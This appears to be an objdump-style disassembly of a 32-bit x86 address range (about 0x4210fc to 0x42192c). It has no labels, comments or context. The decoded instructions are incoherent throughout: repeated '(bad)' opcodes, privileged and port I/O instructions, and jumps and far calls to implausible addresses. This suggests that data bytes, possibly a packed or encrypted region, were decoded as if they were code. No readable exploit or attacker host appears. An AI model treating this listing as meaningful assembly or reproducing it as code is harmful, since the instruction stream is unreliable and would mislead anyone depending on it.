  4210fc:	cmp    eax,0xe68f5504
  421101:	lock neg BYTE PTR [ebx-0x41]
  421105:	sahf   
  421106:	popf   
  421107:	or     edi,eax
  421109:	lds    esp,FWORD PTR [edx+0x605148f4]
  42110f:	cs inc esi
  421111:	jnp    0x42114a
  421113:	mov    al,0xf5
  421115:	mov    esp,0xdefa6374
  42111a:	jge    0x421176
  42111c:	scas   eax,DWORD PTR es:[edi]
  42111d:	pop    ss
  42111e:	cmp    BYTE PTR [ebx],dh
  421120:	rcl    DWORD PTR [ecx-0x5a0f5f50],0x6
  421127:	out    dx,eax
  421128:	mov    ch,dl
  42112a:	xchg   ebp,eax
  42112b:	add    bh,BYTE PTR [edi+0x25580bf4]
  421131:	inc    ebx
  421132:	(bad)  
  421133:	ror    bl,cl
  421135:	jae    0x42119c
  421137:	(bad)  
  421138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421139:	dec    ecx
  42113a:	inc    edx
  42113b:	xchg   edx,esi
  42113d:	dec    esp
  42113e:	sub    BYTE PTR [edi-0x68b5fe1],bh
  421144:	inc    eax
  421145:	pop    ecx
  421146:	dec    ebx
  421147:	int    0x4b
  421149:	outs   dx,DWORD PTR ds:[esi]
  42114a:	scas   eax,DWORD PTR es:[edi]
  42114b:	imul   ecx,edi,0x1140abbc
  421151:	sub    al,ah
  421153:	adc    eax,0x47cfc3d0
  421158:	ja     0x421142
  42115a:	push   ds
  42115b:	push   0x6f313fbd
  421160:	div    BYTE PTR [ebx+0x33]
  421163:	jp     0x4210e7
  421165:	jle    0x42113d
  421167:	and    DWORD PTR [ebp-0x67e64194],esp
  42116d:	mov    eax,0x823a7868
  421172:	xchg   DWORD PTR [edx-0x50],eax
  421175:	pushf  
  421176:	out    0x8e,eax
  421178:	dec    ebx
  421179:	cli    
  42117a:	fstp   QWORD PTR [ebx-0xc2432bf]
  421180:	cmp    eax,0xca179cf6
  421185:	lahf   
  421186:	jne    0x421173
  421188:	sbb    DWORD PTR ss:[ecx-0x5c],ebx
  42118c:	inc    edx
  42118d:	cmp    al,BYTE PTR [ecx+0x6]
  421190:	mov    ebx,0x7521cc9c
  421195:	cs hlt 
  421197:	add    BYTE PTR [esi-0x4f],al
  42119a:	pop    ds
  42119b:	push   ss
  42119c:	into   
  42119d:	lahf   
  42119e:	mov    edi,0x3f66fbbb
  4211a3:	popf   
  4211a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a5:	loopne 0x4211c9
  4211a7:	fisttp DWORD PTR [edx]
  4211a9:	sbb    esi,ecx
  4211ab:	push   ds
  4211ac:	and    dl,BYTE PTR [esi]
  4211ae:	into   
  4211af:	mov    DWORD PTR [eax],ebp
  4211b1:	lock outs dx,DWORD PTR ds:[esi]
  4211b3:	and    DWORD PTR [eax],eax
  4211b5:	push   es
  4211b6:	loop   0x42122e
  4211b8:	inc    ebx
  4211b9:	mov    dh,0x7e
  4211bb:	xchg   esp,eax
  4211bc:	sahf   
  4211bd:	das    
  4211be:	jmp    0xd41f832c
  4211c3:	popf   
  4211c4:	sti    
  4211c5:	push   ecx
  4211c6:	pop    es
  4211c7:	int3   
  4211c8:	inc    ebp
  4211c9:	pop    esp
  4211ca:	and    eax,0xf793a332
  4211cf:	lock dec edi
  4211d1:	pop    ecx
  4211d2:	outs   dx,BYTE PTR ds:[esi]
  4211d3:	outs   dx,DWORD PTR ds:[esi]
  4211d4:	push   esp
  4211d5:	imul   esp,ecx,0x18eb5727
  4211db:	push   ss
  4211dc:	mov    esp,0x174be9b
  4211e1:	adc    al,0xd7
  4211e3:	mov    esi,0x19003bb4
  4211e8:	daa    
  4211e9:	iret   
  4211ea:	jae    0x4211f2
  4211ec:	or     eax,ebx
  4211ee:	pushf  
  4211ef:	in     eax,0x12
  4211f1:	mul    DWORD PTR [edi+0x5c06601f]
  4211f7:	xor    dl,BYTE PTR [ebp+0x126348c7]
  4211fd:	push   esp
  4211fe:	or     ah,dl
  421200:	dec    edx
  421201:	jmp    0xa5b1940d
  421206:	enter  0x7967,0xc
  42120a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42120b:	repnz les ebx,FWORD PTR [ebp-0x1da9b6bd]
  421212:	ss push ecx
  421214:	outs   dx,BYTE PTR fs:[esi]
  421216:	js     0x42119b
  421218:	(bad)  
  421219:	lods   eax,DWORD PTR ds:[esi]
  42121a:	mov    bh,0x15
  42121c:	and    DWORD PTR [esp+edi*4+0x1b24031e],ecx
  421223:	mov    DWORD PTR [eax+0x7bb4d24f],ebp
  421229:	pop    esi
  42122a:	ror    esp,0x1e
  42122d:	imul   ebx,DWORD PTR [ebx],0x54f91cfc
  421233:	fild   QWORD PTR [edx]
  421235:	scas   al,BYTE PTR es:[edi]
  421236:	xchg   ecx,eax
  421237:	add    dl,bl
  421239:	jg     0x4211f7
  42123b:	pop    ecx
  42123c:	xlat   BYTE PTR ds:[ebx]
  42123d:	jns    0x4212a6
  42123f:	cli    
  421240:	data16 sti 
  421242:	xor    al,0xd4
  421244:	rcr    BYTE PTR ds:0x4882d484,cl
  42124a:	xor    eax,0xeea90e9b
  42124f:	xchg   ebp,eax
  421250:	inc    ebp
  421251:	rol    BYTE PTR [eax+0x3c],1
  421254:	cdq    
  421255:	stos   DWORD PTR es:[edi],eax
  421256:	jle    0x421276
  421258:	jecxz  0x42125a
  42125a:	and    DWORD PTR [ecx-0x6ae6e239],0x33857166
  421264:	adc    eax,0x2fead51b
  421269:	pop    eax
  42126a:	push   0xe295025
  42126f:	in     eax,dx
  421270:	std    
  421271:	sbb    DWORD PTR gs:[edi*4+0x49500239],0x3
  42127a:	xor    DWORD PTR [eax+0x2e],0x1cbab6c6
  421281:	add    al,0xb9
  421283:	mov    WORD PTR [eax],?
  421285:	ss mov ah,0x69
  421288:	sbb    al,BYTE PTR [eax+ebx*4-0x69390f91]
  42128f:	push   edx
  421290:	add    DWORD PTR [ebp-0x64],ebx
  421293:	adc    edx,edi
  421295:	rcr    cl,1
  421297:	(bad)  
  421298:	(bad)  
  42129a:	pusha  
  42129b:	fstp   QWORD PTR [ecx+0x3080d87f]
  4212a1:	dec    edi
  4212a2:	outs   dx,DWORD PTR ds:[esi]
  4212a3:	std    
  4212a4:	shr    eax,0xa0
  4212a7:	xchg   edi,eax
  4212a8:	xor    al,0xf7
  4212aa:	aaa    
  4212ab:	jbe    0x421240
  4212ad:	out    dx,al
	...
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0x9a0c477]
  4212ca:	lock mov es,WORD PTR [ecx]
  4212cd:	add    ah,bh
  4212cf:	add    DWORD PTR [eax],eax
  4212d1:	add    BYTE PTR [ecx],bh
  4212d3:	sub    ebx,DWORD PTR [edi+ebp*4]
  4212d6:	cmp    BYTE PTR [edi],dh
  4212d8:	outs   dx,DWORD PTR ds:[esi]
  4212d9:	outs   dx,DWORD PTR ds:[esi]
  4212da:	cwde   
  4212db:	into   
  4212dc:	mov    sp,0x3455
  4212e0:	adc    ch,BYTE PTR ds:0xb18a9a0
  4212e6:	mov    bl,0x92
  4212e8:	jnp    0x4212d2
  4212ea:	dec    edi
  4212eb:	imul   edx,DWORD PTR [ebx+0x28eb3a1b],0x63
  4212f2:	les    edx,FWORD PTR [ecx+0x616f11ef]
  4212f8:	or     ch,BYTE PTR [ecx*1-0x7683539c]
  4212ff:	outs   dx,DWORD PTR ds:[esi]
  421300:	loop   0x421338
  421302:	add    eax,DWORD PTR [esi+eax*4-0x7f]
  421306:	jge    0x421333
  421308:	or     esi,esi
  42130a:	shl    BYTE PTR [edi+ebp*8-0xd],0xe0
  42130f:	cmp    eax,0x8288347f
  421314:	lods   eax,DWORD PTR ds:[esi]
  421315:	sbb    DWORD PTR [ebx+0x44e5d607],esp
  42131b:	xchg   edx,eax
  42131c:	scas   eax,DWORD PTR es:[edi]
  42131d:	ret    
  42131e:	popa   
  42131f:	jmp    0xd64f6426
  421324:	hlt    
  421325:	xor    cl,dl
  421327:	push   edx
  421328:	add    ah,BYTE PTR [ebx-0x59]
  42132b:	push   cs
  42132c:	pushf  
  42132d:	inc    ebp
  42132e:	(bad)  
  42132f:	xchg   ebx,eax
  421330:	in     eax,dx
  421331:	fstp   QWORD PTR [edi+0x58dc5f32]
  421337:	fdiv   QWORD PTR [ebp-0x790231c2]
  42133d:	sbb    BYTE PTR [esi],cl
  42133f:	lahf   
  421340:	adc    al,0x77
  421342:	pushf  
  421343:	retf   
  421344:	leave  
  421345:	add    dl,ah
  421347:	aas    
  421348:	dec    ecx
  421349:	lock fdivr QWORD PTR [ebp+0xd]
  42134d:	sub    eax,0x1a6c54d2
  421352:	push   edx
  421353:	jnp    0x42137f
  421355:	mov    edi,0xacfac0bf
  42135a:	mov    al,0x2f
  42135c:	dec    ecx
  42135d:	int    0x93
  42135f:	ret    0x8f96
  421362:	xor    al,0x7b
  421364:	and    edi,DWORD PTR [edi+ebx*1-0x29c69a96]
  42136b:	xchg   esi,eax
  42136c:	lods   al,BYTE PTR ds:[esi]
  42136d:	dec    esp
  42136e:	(bad)  
  42136f:	cdq    
  421370:	sub    al,0xd0
  421372:	out    dx,al
  421373:	push   0x594d0e00
  421378:	popf   
  421379:	inc    esp
  42137a:	ins    BYTE PTR es:[edi],dx
  42137b:	leave  
  42137c:	pop    ebx
  42137d:	or     edi,edi
  42137f:	or     edi,ecx
  421381:	sbb    dl,BYTE PTR [edi+0x5e]
  421384:	push   esp
  421385:	stos   DWORD PTR es:[edi],eax
  421386:	mov    bh,0x84
  421388:	test   eax,0xe053d0f3
  42138d:	and    eax,0xbcd1a251
  421392:	lds    edi,FWORD PTR [esi+0x64]
  421395:	(bad)  
  421396:	xlat   BYTE PTR ds:[ebx]
  421397:	adc    esi,0xffffffeb
  42139a:	std    
  42139b:	scas   eax,DWORD PTR es:[edi]
  42139c:	shr    BYTE PTR ds:0xa55d3ab8,cl
  4213a2:	scas   eax,DWORD PTR es:[edi]
  4213a3:	pop    ebx
  4213a4:	pop    edi
  4213a5:	add    eax,0x8aaadb54
  4213aa:	dec    esp
  4213ab:	call   0x186f:0x6a5b30cd
  4213b2:	out    dx,al
  4213b3:	test   eax,0xe8181999
  4213b9:	mov    WORD PTR [ecx-0x3bbcb49a],ss
  4213bf:	scas   al,BYTE PTR es:[edi]
  4213c0:	into   
  4213c1:	mov    BYTE PTR [ebx-0x3775fe81],bl
  4213c7:	int    0xae
  4213c9:	dec    esi
  4213ca:	icebp  
  4213cb:	dec    edi
  4213cc:	push   esp
  4213cd:	into   
  4213ce:	cmp    DWORD PTR [edi-0x228f112c],0xffffffa6
  4213d5:	sbb    eax,0x4af464cf
  4213da:	jmp    0xa767c409
  4213df:	xor    BYTE PTR [edx-0x61101b17],ah
  4213e5:	sub    DWORD PTR [eax+0x337979e4],edx
  4213eb:	mov    eax,ds:0x52518f35
  4213f0:	dec    ecx
  4213f1:	pop    ecx
  4213f2:	sub    al,0xb4
  4213f4:	xor    ebx,DWORD PTR [eax+0x60a77521]
  4213fa:	shl    esp,0x39
  4213fd:	inc    esi
  4213fe:	repz ja 0x421435
  421401:	mov    edx,0x32c7441a
  421406:	adc    ebp,ebp
  421408:	or     esi,ebx
  42140a:	loope  0x421454
  42140c:	(bad)  
  42140f:	cdq    
  421410:	js     0x421432
  421412:	jp     0x4213a7
  421414:	ins    DWORD PTR es:[edi],dx
  421415:	sbb    eax,0x2c5fe396
  42141a:	leave  
  42141b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42141c:	adc    DWORD PTR [eax-0x1ffa0d60],0xe0ea6986
  421426:	nop
  421427:	sbb    al,0xfc
  421429:	mov    esp,eax
  42142b:	xor    al,0xbd
  42142d:	pop    ecx
  42142e:	mov    ch,0x0
  421430:	and    DWORD PTR [esi],esp
  421432:	das    
  421433:	mov    esi,0xea10dd85
  421438:	ds (bad) 
  42143a:	sub    ecx,DWORD PTR [esi-0x10]
  42143d:	call   0x633864b7
  421442:	not    BYTE PTR [edi+0x1769c62]
  421448:	add    DWORD PTR [ecx+0x618fd904],esi
  42144e:	test   eax,0x66f00293
  421453:	and    BYTE PTR [edi-0x52dc788e],ch
  421459:	cmp    eax,0x2423f1f5
  42145e:	pop    ebp
  42145f:	(bad)
  421463:	jp     0x4214a1
  421465:	inc    edx
  421466:	add    DWORD PTR [edi+0x474b0f83],esi
  42146c:	mov    al,0xd1
  42146e:	xchg   ecx,esi
  421470:	push   cs
  421471:	inc    edx
  421472:	and    eax,0x44272f9b
  421477:	les    esi,FWORD PTR [bx]
  42147a:	(bad)
  42147d:	cmp    ch,bl
  42147f:	cmp    ebx,esi
  421481:	(bad)  
  421482:	push   ss
  421483:	jp     0x6cebc780
  421489:	scas   al,BYTE PTR es:[edi]
  42148a:	addr16 sub eax,0xf25f2952
  421490:	mov    ebp,0x96e69594
  421495:	fldenv [edi-0x6de49fe9]
  42149b:	stos   BYTE PTR es:[edi],al
  42149c:	xchg   BYTE PTR [esi],cl
  42149e:	icebp  
  42149f:	mov    ebx,0x38e60b2d
  4214a4:	mov    WORD PTR [ecx],cs
  4214a6:	rcr    bh,cl
  4214a8:	out    dx,al
  4214a9:	fidivr WORD PTR [ecx-0x326c72ff]
  4214af:	mov    esp,0x1196c263
  4214b4:	call   0xc2b1:0xd1ed31
  4214bb:	jmp    0x3310be08
  4214c0:	ja     0x42148c
  4214c2:	sar    ebp,cl
  4214c4:	cs cmp eax,0xebe37847
  4214ca:	and    ah,BYTE PTR [ecx-0x45]
  4214cd:	push   esp
	...
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	ror    esi,0xdc
  4214e9:	sub    esp,0xfc000190
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [eax+esi*8],bl
  4214f4:	outs   dx,DWORD PTR ds:[esi]
  4214f5:	ds fs mov esp,0x2b0681c4
  4214fc:	enter  0x7ef5,0x1f
  421500:	or     dl,BYTE PTR ds:0x4b07092a
  421506:	push   edi
  421507:	mov    esi,0x959828d0
  42150c:	ja     0x42153b
  42150e:	mov    ecx,gs
  421510:	icebp  
  421511:	retf   
  421512:	cld    
  421513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421514:	sub    DWORD PTR [ebx-0x3d],esp
  421517:	pop    ebx
  421518:	mov    ebx,0x66898071
  42151d:	push   0x7c989cb8
  421522:	inc    esi
  421523:	ins    DWORD PTR es:[edi],dx
  421524:	rcr    BYTE PTR ds:0xbfa52062,1
  42152a:	and    DWORD PTR [esi-0x68],0x48
  42152e:	adc    ah,BYTE PTR [eax]
  421530:	fnstcw WORD PTR [esi-0x76]
  421533:	rcr    edi,1
  421535:	add    DWORD PTR [ecx],ebx
  421537:	scas   eax,DWORD PTR es:[edi]
  421538:	push   edi
  421539:	mov    edx,0xa27ada68
  42153e:	ret    
  42153f:	in     eax,dx
  421540:	add    dh,BYTE PTR [edi-0x1b]
  421543:	adc    eax,0x996f4063
  421548:	fwait
  421549:	jecxz  0x421580
  42154b:	outs   dx,BYTE PTR ds:[esi]
  42154c:	sahf   
  42154d:	adc    eax,0x1adcaf0d
  421552:	sbb    eax,0xc6756b7b
  421557:	adc    al,0xd8
  421559:	sub    DWORD PTR [ebx+0x4c0260b],ebx
  42155f:	pop    DWORD PTR [ecx]
  421561:	push   edi
  421562:	lahf   
  421563:	xchg   edi,eax
  421565:	(bad)  
  421566:	sbb    ch,ch
  421568:	std    
  421569:	add    bh,bh
  42156b:	es out 0x56,al
  42156e:	jno    0x421570
  421570:	cdq    
  421571:	fcom   DWORD PTR [ebx+edi*4+0x2b]
  421575:	or     al,0x2a
  421577:	sbb    edi,ebx
  421579:	dec    ebp
  42157a:	inc    BYTE PTR [ebx]
  42157c:	scas   al,BYTE PTR es:[edi]
  42157d:	jmp    0x4215e8
  42157f:	js     0x421551
  421581:	pop    ss
  421582:	aaa    
  421583:	not    bl
  421585:	mov    cs,WORD PTR [esi+esi*2-0x61]
  421589:	adc    DWORD PTR [esi-0x7576b947],edx
  42158f:	mov    ds:0x4e91ac5b,eax
  421594:	cmp    esp,DWORD PTR [eax]
  421596:	pop    ecx
  421597:	iret   
  421598:	mov    ebp,0xcc7db707
  42159d:	loopne 0x42154e
  42159f:	xor    BYTE PTR [edx],bh
  4215a1:	add    eax,0xa13c81c8
  4215a6:	shl    DWORD PTR [edx],1
  4215a8:	sub    ebp,ebp
  4215aa:	push   esp
  4215ab:	mov    dh,0xee
  4215ad:	mov    ecx,0xd5b9e5bf
  4215b2:	inc    eax
  4215b3:	inc    esp
  4215b4:	(bad)  
  4215b5:	cdq    
  4215b6:	in     al,dx
  4215b7:	hlt    
  4215b8:	pop    edi
  4215b9:	sub    DWORD PTR [ecx-0x1f],ecx
  4215bc:	fsubp  st(0),st
  4215be:	lods   eax,DWORD PTR ds:[esi]
  4215bf:	jbe    0x421554
  4215c1:	js     0x42154a
  4215c3:	cmp    BYTE PTR [esi+0x2c],bh
  4215c6:	pushf  
  4215c7:	and    BYTE PTR [eax+eiz*4+0x5a],dl
  4215cb:	mov    ds:0x2d692197,eax
  4215d0:	sar    DWORD PTR [ecx-0x52],1
  4215d3:	and    BYTE PTR [edx+0x2c],dl
  4215d6:	stos   BYTE PTR es:[edi],al
  4215d7:	das    
  4215d8:	repz cwde 
  4215da:	and    eax,0xcc7867cb
  4215df:	mul    edi
  4215e1:	dec    eax
  4215e2:	push   0x7f873611
  4215e7:	fbld   TBYTE PTR [esi]
  4215e9:	inc    edx
  4215ea:	sub    BYTE PTR [ebp+esi*1-0x7f],ch
  4215ee:	mov    ebp,0x94517230
  4215f3:	adc    al,0xf4
  4215f5:	push   ds
  4215f6:	bound  edx,QWORD PTR [esi-0x1a]
  4215f9:	adc    esi,DWORD PTR [esi+0x1f2ef035]
  4215ff:	xchg   edi,eax
  421600:	sbb    bh,BYTE PTR [eax+edx*2+0x4a2151f5]
  421607:	retf   
  421608:	mov    cl,BYTE PTR [ebp-0x4b805eb3]
  42160e:	or     DWORD PTR [edi-0x77],esi
  421611:	push   ebp
  421612:	xor    BYTE PTR [ecx+ebx*2-0x521498f6],0xf8
  42161a:	jmp    0x4215c8
  42161c:	sti    
  42161d:	sub    eax,0x4d4ce71e
  421622:	icebp  
  421623:	pop    edi
  421624:	stc    
  421625:	ins    BYTE PTR es:[edi],dx
  421626:	out    0x9a,al
  421628:	sahf   
  421629:	adc    eax,0xe0b43487
  42162e:	loope  0x4215ba
  421630:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  421632:	fwait
  421633:	data16 rcr BYTE PTR [ebx-0x20],0xfd
  421638:	mov    ?,WORD PTR [ebx]
  42163a:	jns    0x4215d0
  42163c:	dec    eax
  42163d:	cdq    
  42163e:	push   es
  42163f:	xor    DWORD PTR [edi+0x9],ebx
  421642:	(bad)  
  421643:	icebp  
  421644:	xor    edi,DWORD PTR [ebx-0x56]
  421647:	arpl   WORD PTR ds:0x7aa9eb32,di
  42164d:	loopne 0x4216c4
  42164f:	push   edi
  421650:	addr16 repnz pop ebp
  421653:	push   ebp
  421654:	xor    DWORD PTR [ecx],eax
  421656:	pop    ds
  421657:	int3   
  421658:	inc    esp
  421659:	sbb    bh,BYTE PTR [eax]
  42165b:	popf   
  42165c:	mov    ecx,0xec9c8733
  421661:	pop    edx
  421662:	sub    cl,BYTE PTR [eax+0x27f2cb84]
  421668:	xor    eax,DWORD PTR [edx-0x40]
  42166b:	or     eax,0x5c9b8a41
  421670:	fdivr  QWORD PTR [edx+0x65]
  421673:	rcr    BYTE PTR [edi-0x5e],1
  421676:	popa   
  421677:	xchg   BYTE PTR [eax-0x4c09fc8],bh
  42167d:	scas   al,BYTE PTR es:[edi]
  42167e:	jecxz  0x421606
  421680:	jne    0x4216ba
  421682:	into   
  421683:	ret    0x9825
  421686:	sub    DWORD PTR [edi+0x38],esp
  421689:	lods   eax,DWORD PTR ds:[esi]
  42168a:	pop    esi
  42168b:	add    dl,BYTE PTR [edi+0x1e]
  42168e:	and    DWORD PTR [ecx-0x35],0xfffffffb
  421692:	js     0x42163d
  421694:	pop    esp
  421695:	je     0x4216eb
  421697:	mov    esi,0xbd367571
  42169c:	mov    edi,DWORD PTR [ebp+ecx*2+0x4c]
  4216a0:	mov    ecx,0x5c1b98b0
  4216a5:	xor    esp,esi
  4216a7:	mov    gs,ecx
  4216a9:	pop    ss
  4216aa:	inc    edi
  4216ab:	lea    eax,[ebp-0x21251a8b]
  4216b1:	xor    al,0x43
  4216b3:	push   0xf6dec24b
  4216b8:	dec    ecx
  4216b9:	mov    ebx,esp
  4216bb:	sahf   
  4216bc:	cld    
  4216bd:	std    
  4216be:	ror    DWORD PTR ds:0xeb15298d,0x86
  4216c5:	sar    BYTE PTR [ebx+0x3acb5f57],1
  4216cb:	dec    esp
  4216cc:	or     eax,0x9d5609ba
  4216d1:	stos   DWORD PTR es:[edi],eax
  4216d2:	(bad)  
  4216d3:	das    
  4216d4:	jecxz  0x421711
  4216d6:	xchg   BYTE PTR [edx+ebp*2+0x0],bh
  4216da:	(bad)  
  4216db:	ins    BYTE PTR es:[edi],dx
  4216dc:	shl    DWORD PTR [ebp+0x5d64b086],cl
  4216e2:	mov    eax,0xdfeb4fcd
  4216e7:	mov    ds:0x39c0f867,al
  4216ec:	jge    0x42173b
	...
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	imul   BYTE PTR [ecx-0xf]
  421708:	add    dl,dh
  42170a:	call   0xfc4218a1
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [eax-0x628ac61b],bl
  421717:	pop    edx
  421718:	mov    dl,0xdc
  42171a:	ds cli 
  42171c:	push   cs
  42171d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42171e:	jne    0x4216ca
  421720:	pushf  
  421721:	jg     0x4216d5
  421723:	(bad)  
  421724:	out    0xf4,eax
  421726:	push   edx
  421727:	pop    es
  421728:	lods   al,BYTE PTR ds:[esi]
  421729:	ret    
  42172a:	inc    ebx
  42172b:	and    ebp,DWORD PTR [edx+ecx*4-0xb]
  42172f:	xchg   edi,eax
  421730:	dec    edx
  421731:	xor    ah,BYTE PTR [ebp-0x42e4e010]
  421737:	add    cl,BYTE PTR [edi-0x60761e56]
  42173d:	bnd jle 0x421738
  421740:	pop    esp
  421741:	dec    esp
  421742:	cmp    bh,BYTE PTR [ecx]
  421744:	mov    ds:0x9578de49,eax
  421749:	jp     0x42172b
  42174b:	mov    ds:0xb1d7b4b2,al
  421750:	in     al,0xc
  421752:	jno    0x421792
  421754:	das    
  421755:	les    edx,FWORD PTR [edi+0x6e]
  421758:	ret    
  421759:	sbb    DWORD PTR [ebx-0x68],eax
  42175c:	or     edi,DWORD PTR gs:[ecx]
  42175f:	int3   
  421760:	mov    edi,0x1730b88a
  421765:	jle    0x421733
  421767:	rcr    DWORD PTR [ebp-0xc0f3268],cl
  42176d:	clc    
  42176e:	cmp    esi,ebp
  421770:	adc    al,0x71
  421772:	pop    ebx
  421773:	lods   al,BYTE PTR ds:[esi]
  421774:	cld    
  421775:	mov    ds:0xcd644bed,eax
  42177a:	jge    0x421740
  42177c:	dec    edi
  42177d:	inc    ebx
  42177e:	int    0x12
  421780:	imul   eax,ebx,0xffffffeb
  421783:	add    bl,BYTE PTR [ebx-0x97af059]
  421789:	ret    
  42178a:	iret   
  42178b:	pushf  
  42178c:	jns    0x4217fc
  42178e:	sbb    DWORD PTR [ebx],edx
  421790:	add    edi,DWORD PTR [esp+esi*8-0xa]
  421794:	clc    
  421795:	rcl    DWORD PTR [eax+esi*1],0x59
  421799:	ins    DWORD PTR es:[edi],dx
  42179a:	sahf   
  42179b:	push   ebp
  42179c:	mov    ebx,0x945a12d4
  4217a1:	repnz and DWORD PTR [edx],eax
  4217a4:	and    ch,BYTE PTR [ecx-0x221dfec4]
  4217aa:	fwait
  4217ab:	pop    ecx
  4217ac:	sub    dl,BYTE PTR [edx]
  4217ae:	aad    0x19
  4217b0:	test   al,0xf8
  4217b2:	mov    edx,0xdcaa34a
  4217b7:	fsubr  DWORD PTR [edx-0xc4901ba]
  4217bd:	xchg   edx,eax
  4217be:	fdivr  DWORD PTR [edx-0x26]
  4217c1:	ins    BYTE PTR es:[edi],dx
  4217c2:	and    al,0xa3
  4217c4:	pop    ds
  4217c5:	sub    ebx,DWORD PTR [ebp+0x54]
  4217c8:	jge    0x421817
  4217ca:	pop    eax
  4217cb:	int    0xbe
  4217cd:	jp     0x42177d
  4217cf:	ins    DWORD PTR es:[edi],dx
  4217d0:	push   es
  4217d1:	or     ah,dh
  4217d3:	xor    al,0x5e
  4217d5:	repnz (bad) 
  4217d9:	dec    BYTE PTR [ecx+ebp*8+0x7331a25d]
  4217e0:	mov    esi,0xe0a0136
  4217e5:	sbb    BYTE PTR [edx+0x3e],dh
  4217e8:	ins    BYTE PTR es:[edi],dx
  4217e9:	mov    esp,0xb43a8f74
  4217ee:	in     eax,0x90
  4217f0:	jmp    0xe343:0xad6f3d68
  4217f7:	xchg   esi,eax
  4217f8:	gs pop ebx
  4217fa:	jne    0x4217c7
  4217fc:	dec    ebp
  4217fd:	jle    0x42184e
  4217ff:	jo     0x421807
  421801:	shr    BYTE PTR [ecx+0x493d7ba1],0xb6
  421808:	push   es
  421809:	dec    edi
  42180a:	or     DWORD PTR [ebp-0x77],ebp
  42180d:	pushf  
  42180e:	test   BYTE PTR [esi],dl
  421810:	out    dx,al
  421811:	xchg   edx,eax
  421812:	adc    eax,0x79ce2b8
  421817:	sub    al,0x14
  421819:	test   al,0xed
  42181b:	aam    0x72
  42181d:	jb     0x421801
  42181f:	shr    DWORD PTR [ecx],0x9f
  421822:	jae    0x421841
  421824:	int3   
  421825:	add    BYTE PTR [ebx+ecx*2],0xa2
  421829:	(bad)  
  42182a:	aad    0x3f
  42182c:	icebp  
  42182d:	js     0x421881
  42182f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421830:	popa   
  421831:	rcr    DWORD PTR [ebx],1
  421833:	fld    TBYTE PTR [ebp+ebp*4-0x6f]
  421837:	add    BYTE PTR [edi+0x19],cl
  42183a:	xchg   esp,eax
  42183b:	cmp    BYTE PTR [eax+0x6b2427ae],dl
  421841:	mov    esp,0xbbcb48a9
  421846:	jg     0x421888
  421848:	les    eax,FWORD PTR [esi+0x6a66655f]
  42184e:	fiadd  DWORD PTR fs:[esp+edi*1+0x3998e2]
  421856:	mov    ebp,0x77cd2abc
  42185b:	xchg   BYTE PTR ds:0x22cb4ff2,ah
  421861:	daa    
  421862:	mov    ah,0x50
  421864:	dec    ebx
  421865:	sti    
  421866:	cmp    BYTE PTR [esi-0x67fb0731],bh
  42186c:	imul   ebp,DWORD PTR [ebx-0x5],0xe789f540
  421873:	xor    DWORD PTR [edi+0x38],ebx
  421876:	push   ebx
  421877:	loopne 0x421839
  421879:	cmp    BYTE PTR [edx-0x7e],bh
  42187c:	and    BYTE PTR [esi-0x33d707dd],0xfe
  421883:	popa   
  421884:	sar    DWORD PTR [edx+0x29],cl
  421887:	jnp    0x4218bd
  421889:	inc    edx
  42188a:	icebp  
  42188b:	dec    ebp
  42188c:	pop    esi
  42188d:	pusha  
  42188e:	sahf   
  42188f:	mov    al,0xd2
  421891:	pushf  
  421892:	shl    DWORD PTR [esi+ecx*1-0x40948338],1
  421899:	in     al,dx
  42189a:	jno    0x421897
  42189c:	gs pop esp
  42189e:	adc    eax,0xb943de96
  4218a3:	mov    ch,0xb3
  4218a5:	call   0xb20d1860
  4218aa:	jl     0x421863
  4218ac:	enter  0xfd86,0xb3
  4218b0:	push   edx
  4218b1:	rcl    BYTE PTR [ecx],cl
  4218b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b4:	add    bh,dl
  4218b6:	cmp    BYTE PTR [eax-0x456801dd],al
  4218bc:	xchg   ebx,eax
  4218bd:	loop   0x42184f
  4218bf:	rcr    DWORD PTR [esi-0x5e],0x76
  4218c3:	add    DWORD PTR [edi],edi
  4218c5:	xor    BYTE PTR [ebp+0x13ebe9c9],cl
  4218cb:	fwait
  4218cc:	push   ebx
  4218cd:	mov    esi,0xcd302a
  4218d2:	adc    al,0x86
  4218d4:	cmp    BYTE PTR [ecx-0x26],0xe8
  4218d8:	xor    cl,dh
  4218da:	bswap  esp
  4218dc:	pop    edi
  4218dd:	out    0xbf,al
  4218df:	or     eax,0x406f123e
  4218e4:	mov    cl,0xb5
  4218e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e7:	sbb    eax,0x441aab78
  4218ec:	jge    0x42191d
  4218ee:	jno    0x4218bd
  4218f0:	retf   0x6d42
  4218f3:	sbb    esp,DWORD PTR [ecx+esi*1-0x4e351907]
  4218fa:	adc    BYTE PTR [eax+0x16],al
  4218fd:	push   esi
  4218fe:	jmp    0x5d800b04
  421903:	repz add cl,BYTE PTR [edx+0x235caec8]
  42190a:	mov    al,0x18
  42190c:	into   
  42190d:	(bad)  
	...
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    bh,BYTE PTR [eax+0x7d]
  421928:	xchg   ecx,eax
  421929:	jns    0x42190f
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
